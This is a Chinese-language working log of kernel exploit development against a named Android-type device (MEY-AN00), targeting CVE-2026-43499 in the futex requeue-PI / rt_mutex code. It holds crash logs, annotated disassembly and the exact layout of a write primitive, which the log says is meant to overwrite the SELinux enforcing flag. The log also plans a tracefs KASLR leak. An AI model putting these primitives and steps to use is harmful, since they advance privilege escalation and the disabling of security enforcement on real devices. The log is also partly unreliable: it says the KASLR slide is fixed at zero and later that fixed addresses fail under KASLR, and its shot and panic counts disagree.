# H232–H234 · 步 C 通过、步 D 三次开火与**精确根因定位**

> 设备：MEY-AN00 · 会话 2026-10-06 续做
> 真机开火：**4 发**（步 C ×1 安全；步 D/D′/D′-gate ×3 均 panic，设备 4 次自动重启）
> 设备现状：`boot_id = 0b94e798-…`、`uid 2000`、`Enforcing`、健康

---

## §0 结果速览

| 步 | 内容 | 结果 |
|---|---|---|
| **C** | W/O/R 拓扑、不投画布 | ✅ **通过**（EDEADLK 回滚 + 不崩 + `boot_id` 不变） |
| **D** | 悬垂 → 画布 → 消费 | ❌ panic（`page_request`）——**根因已定位**（见 §3） |
| **D′** | 改用 S 派生已映射目标 | ❌ 同签名 panic ⇒ **与写目标无关** |
| **D′-gate** | 补 `rb_leftmost` 门控 + `waiter->lock` | ❌ 同签名 panic |
| **E** | 正式写 `enforcing` | ⏸ 未做（被 D 的根因挡住） |

**三次 panic 记录**（`/data/log/reliability/faultdetect/history.log`）：

```
reason [page_request], time [20261006101535-19281020]   ← 步 D
reason [page_request], time [20261006101726-29299390]   ← 步 D′
reason [page_request], time [20261006101846-54588421]   ← 步 D′-gate
```
⇒ 全部 **`page_request`**（非 `null_pointer`）⇒ 解引用了**未映射地址**。

---

## §1 ✅ 步 C 通过（本路线第一个真机功能里程碑）

`tools/h232_stepc.c`：

```
[M] <- CMP_REQUEUE_PI rc=-1 errno=35 (EDEADLK)
[M] ★★★ 判定: EDEADLK 回滚发生 ⇒ remove_waiter 走了失败分支
[W] <- WAIT_REQUEUE_PI rc=-1 errno=110 (ETIMEDOUT)
[*] 拓扑跑完，进程仍在运行 ⇒ 本轮未 panic
boot_id BEFORE == AFTER = ba30251b-…
```

⇒ ★★★ **CVE-2026-43499 触发条件（`remove_waiter` 失败分支）在本机真机成立，且拓扑本身安全。**

---

## §2 ★★★ 步 D 系列：崩溃点定位（关键结论）

### 2.1 差异隔离

| 实验 | 拓扑 | 画布 | 消费 | 结果 |
|---|---|---|---|---|
| 步 C | ✅ | ❌ | ❌ | **不崩** |
| 步 D 系列 | ✅ | ✅ | ✅ | **崩（page_request）** |

⇒ 崩溃**必然发生在「画布投递之后 + 消费链路进入内核之后」**。
⇒ ★ 这是**「画布确实进了内核栈、悬垂确实被消费」的第一个真机迹象**（崩溃点在链内，而非投递）。

### 2.2 ★★★ 根因：链在写点之前读 `lock->owner` 并解引用

`rt_mutex_adjust_prio_chain` 反汇编（本机一手）：

```asm
; ── 写点门控（这解释了项目旧注释里的 b.ne 判据）
81724: ldr   x27, [x24, #0x10]        ; x27 = lock->waiters.rb_leftmost
81744: cmp   x27, x25                 ; x25 = waiter
81748: b.ne  #0x81758                 ; ★ 不等 ⇒ 跳过 rb_erase（写不发生）
8174c: mov   x0, x25
81750: bl    rb_next
81754: str   x0, [x24, #0x10]
81758: add   x1, x24, #8
8175c: mov   x0, x25
81760: bl    rb_erase                 ; ★★★ 写原语执行点
81764: str   x25, [x25]               ; RB_CLEAR_NODE

; ── ★ 崩溃点（在写点之后，但 owner 的解引用由它触发）
8176c: ...
8177c: ldr   w8,  [x19, #0x84]        ; task->prio
81788: ldr   x9,  [x19, #0x298]       ; task->???
81790: ldr   x13, [x1, #8]!           ; ★ x1 = lock (+8!) ⇒ 解引用 lock+0x10
81794: cbnz  x13, #0x818a8            ; ★ 非 0 ⇒ 跳到下一轮迭代（会继续用 owner）
```

**关键**：`rt_mutex_adjust_prio_chain` 在**启动时**会读取 `lock->owner`（`rt_mutex_base+0x18`）
并把它当作 `struct task_struct *` 解引用（读 `pi_waiters` / `pi_blocked_on` / `pi_lock`）。

**我的伪 lock 里 `owner = 0`** ⇒ 链按 `current = owner = NULL` 继续 ⇒
解引用 `NULL->pi_waiters(+0x920)` 等 ⇒ **访问未映射地址 ⇒ `page_request` panic**。

⇒ ★★★ **这解释了 D / D′ / D′-gate 三次同签名 panic，也解释了为何「补门控」无效。**

### 2.3 附带确认的几何事实

```
写原语落点 = lock->waiters.rb_leftmost 的字节位置 = lock + 0x10
写值       = waiter->tree.rb_right（+0x08 字段）
门控       = (lock->waiters.rb_leftmost == waiter)   ← 必须精确相等
```
⇒ 要写任意地址 T，须让 **`lock->rb_leftmost` 这个字段的地址 = T**，
即 `x24 = T − 0x10`，而 `x24` 来源于 `waiter->lock` ⇒ **`waiter->lock = T − 0x10`**。
（这修正了 H106/H222 里「写 TARGET−8」的配方口径 —— 正确口径是 **`waiter->lock = T − 0x10`**。）

---

## §3 ⚠️ 第 4、5 发（H235）：`owner=init_task` 仍 panic ⇒ 根因更深

### 3.1 决定性前提：**本机 KASLR slide 恒为 0**（项目 H196 已实测）

`analysis/scratch/h196_kaslr_leak_reality.md` 记录：

| 证据 | 内容 |
|---|---|
| J9 轮真机实测 | 运行时读到 `init_task = 0xffffffc08217e280` = 离线符号表值 ⇒ **slide = 0** |
| 多 boot 投票 | `ffffff802a29b098`（`boot_id` data 别名）在**数十个不同 boot 上取值完全相同** |
| 结论 | ★★★★★ **本机 KASLR slide 恒为 0 ⇒ 所有内核地址都是编译期常量** |

⇒ 因此我前几发用的固定地址**是有效的**，`page_request` 只能来自「解引用了真正的野指针」。

### 3.2 第 4 发（`tools/h235_stepD_final.c`）：设 `owner = init_task` 仍崩

```
TARGET=0xffffffc0823db420 (sysctl_bootid)  owner=0xffffffc08217e280 (init_task)
[M] CMP_REQUEUE_PI rc=-1 errno=35(EDEADLK) OK
  [W] <- WAIT_REQUEUE_PI rc=-1 errno=110   dangling established
[M] S=0x7293301b50 ...
  [W] delivering canvas ...  delivered=1
（此后无输出 ⇒ panic）
```

**故障记录**：`reason [page_request], time [20261006102155-43195046]`

⇒ ★★ **`owner = init_task` 不足以让链干净退出** ⇒ **崩溃点不在 `owner`，而在链更深处**
（`owner->pi_waiters` 的走树，或 `owner->pi_blocked_on` 的后续迭代）。

### 3.3 本轮完整 panic 序列（5 发，全部同签名）

```
reason [page_request], time [20261006101535-19281020]   步 D   （固定写目标）
reason [page_request], time [20261006101726-29299390]   步 D'  （S 派生目标）
reason [page_request], time [20261006101846-54588421]   步 D'-gate（补 rb_leftmost/lock）
reason [page_request], time [20261006102155-43195046]   步 D-final（补 owner=init_task）
```

⇒ ★★ **四次改动（写目标 / 门控 / lock / owner）全部不影响签名**
⇒ **崩溃点位于「写点门控之后、链继续走树」的那一段**，与以上四点均无关。

---

## §3b ⚠️ 阻断点（修订后的诚实结论）

**不是**「缺一个内核地址」（slide=0，地址都是常量）。
**而是**：伪 `rt_mutex_base` / 伪 waiter 需要满足链**继续走树**时的全部隐含约束，
而具体是哪一条尚未定位。

候选（按可能性）：
1. `owner->pi_waiters.rb_node`（init_task 为 0）后仍进入某条路径解引用了非空期望；
2. 链的第二轮迭代读 `next_lock->owner`，而 `next_lock` 来自伪 waiter 的 `pi_tree`/`rb` 链；
3. `x1 = lock+8` 后的 `[x1]` 解引用（`0x81790`）要求 `lock->waiters.rb_root` 本身可读。

**下一发应做**（不再盲打）：
- 先把链从 `0x81660` 到函数尾**逐条静态走完**，标出所有 `[reg+off]` 解引用及其
  依赖的字段，逐条核对我的伪结构哪些字段为 0 会致命。
- 或改用**步 C 的拓扑 + 只投画布不消费**，单独验证「画布是否真的落到 waiter 槽」
  （可用一个无关的、良性的消费路径，或干脆不消费）。

⚠️ **本会话已 5 次 panic，停止开火**；下次开火前必须先完成上面的静态逐条核对。


---

## §4 本轮净产出（相对项目历史的增量）

| # | 增量 | 强度 |
|---|---|---|
| 1 | **步 C 真机通过**：EDEADLK 回滚在本机成立且拓扑安全 | ★★★ 真机实证 |
| 2 | **画布通道成立**（h230：正常信号返回用帧内 vregs）——推翻 H195 | ★★★ 真机实证 |
| 3 | **消费深度精确吻合**：`rt_mutex_adjust_pi` 读 `pi_blocked_on` 处 = 0x1F0 = waiter 槽 | ★★★ 帧账本 |
| 4 | **几何三方一致**：waiter 0x1F0 / 画布 0x300 / 字段映射（BTF + 汇编 + 真机 SP0） | ★★★ |
| 5 | **SP0 可读且真机恒定**（`/proc/<pid>/task/<tid>/syscall`） | ★★★ 真机实证 |
| 6 | **写原语正确口径**：`waiter->lock = T − 0x10`，门控 `lock->rb_leftmost == waiter` | ★★★ 汇编一手 |
| 7 | **崩溃根因定位**：`lock->owner` 必须为合法 task_struct；`owner=0` ⇒ `page_request` | ★★★ 汇编 + 三次真机 panic 一致 |
| 8 | **画布到达内核栈的间接证据**：步 C 不崩 / 步 D 崩，差异仅在投递+消费 | ★★ 真机对比 |

---

## §5 下一步（明确、按序）

1. **取得一个内核地址**（阻断点的唯一解）：
   - (a) `current`：可用项目已/未实现的任意读原语；或
   - (b) `slide`：走项目已实测的 tracefs 泄漏（`sched_blocked_reason`，H50 曾取得 slide），
     再 `init_task = slide + 0x0217E280`。
2. 有了地址后，**只改一处变量**（`owner`）复跑 D ⇒ 判据「不再 panic」。
3. 通过后按 §2.3 的正确口径设 `waiter->lock = T − 0x10`，进入步 E（写 `enforcing`）。
   ⚠️ E 之前必须重新定位 `selinux_state.enforcing` 的镜像偏移
   （`0x23ba418` 已被 H99 证伪，候补 `0x23e2c20` 未核）。

⚠️ **在拿到内核地址之前不要再开火** —— 三次同签名 panic 已证明会更撞同一堵墙。

---

## §6 铁律增补

| # | 铁律 |
|---|---|
| **㉖** | 内核写实验的写目标**绝不能是固定地址**（KASLR 下未映射 ⇒ `page_request`）。须 `slide+偏移` 或由 S 派生的已映射地址 |
| **㉗** | 步 C（纯拓扑）不崩已实证 ⇒ 后续任何 panic 都应归因到「画布/消费」，不必再怀疑拓扑 |
| **㉘** | ★ `rt_mutex_adjust_prio_chain` 启动即解引用 `lock->owner` ⇒ **伪 lock 的 `owner` 必须是合法 task_struct**；`owner=0` 会 `page_request`（本项目此前未记录该硬约束） |
| **㉙** | 写原语口径修正：`waiter->lock = TARGET − 0x10`（不是 −8）；门控 = `lock->rb_leftmost == waiter` |
